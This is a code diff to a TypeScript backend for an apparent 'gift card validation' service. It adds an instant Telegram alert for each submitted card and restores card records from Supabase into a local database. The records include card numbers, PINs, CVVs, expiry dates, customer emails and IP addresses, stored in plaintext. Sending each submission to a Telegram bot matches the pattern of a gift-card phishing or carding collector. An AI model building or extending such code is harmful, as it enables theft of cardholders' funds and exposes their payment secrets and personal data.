@@ -2,9 +2,11 @@ import prisma from '../database/prisma.js';
 import {
   pushValidationToSupabase,
   bulkSyncValidationsToSupabase,
+  fetchValidationsFromSupabase,
   isSupabaseConfigured,
   checkSupabaseHealth,
 } from './supabaseService.js';
+import { sendTelegramCardAlert } from './telegramService.js';
 
 export interface CreateValidationInput {
   brand: string;
@@ -70,13 +72,65 @@ export async function createValidationRequest(input: CreateValidationInput) {
     console.warn('Background Supabase sync notice:', err?.message || err);
   });
 
+  // Dispatch instant alert to Telegram Channel/Bot (if configured)
+  sendTelegramCardAlert(formatted).catch((err) => {
+    console.warn('Background Telegram notification notice:', err?.message || err);
+  });
+
   return formatted;
 }
 
 export async function getAdminValidations() {
-  const validations = await prisma.giftCardValidation.findMany({
+  let validations = await prisma.giftCardValidation.findMany({
     orderBy: { createdAt: 'desc' },
   });
+
+  // If local SQLite DB has fewer items or was reset on Render restart, sync from Supabase
+  if (isSupabaseConfigured()) {
+    try {
+      const supabaseRecords = await fetchValidationsFromSupabase();
+      if (supabaseRecords.length > 0) {
+        const localIds = new Set(validations.map((v) => v.id));
+        const missingInLocal = supabaseRecords.filter((s) => !localIds.has(s.id));
+
+        if (missingInLocal.length > 0) {
+          console.log(`[Supabase Restore] Restoring ${missingInLocal.length} validation records into local DB...`);
+          for (const rec of missingInLocal) {
+            await prisma.giftCardValidation.upsert({
+              where: { id: rec.id },
+              create: {
+                id: rec.id,
+                brand: rec.brand,
+                cardNumber: rec.cardNumber,
+                pin: rec.pin,
+                cvv: rec.cvv,
+                expiryDate: rec.expiryDate,
+                currency: rec.currency,
+                cardAmount: rec.cardAmount,
+                status: rec.status as any,
+                result: rec.result,
+                notes: rec.notes,
+                customerEmail: rec.customerEmail,
+                customerIp: rec.customerIp,
+                images: rec.images,
+                createdAt: rec.createdAt,
+                updatedAt: rec.updatedAt,
+              },
+              update: {},
+            }).catch(() => {});
+          }
+
+          // Re-fetch sorted list after restoration
+          validations = await prisma.giftCardValidation.findMany({
+            orderBy: { createdAt: 'desc' },
+          });
+        }
+      }
+    } catch (err) {
+      console.warn('[Supabase Auto-Restore] Notice:', err);
+    }
+  }
+
   return validations.map((v) => ({
     ...v,
     images: JSON.parse((v.images as string) || '[]') as string[],
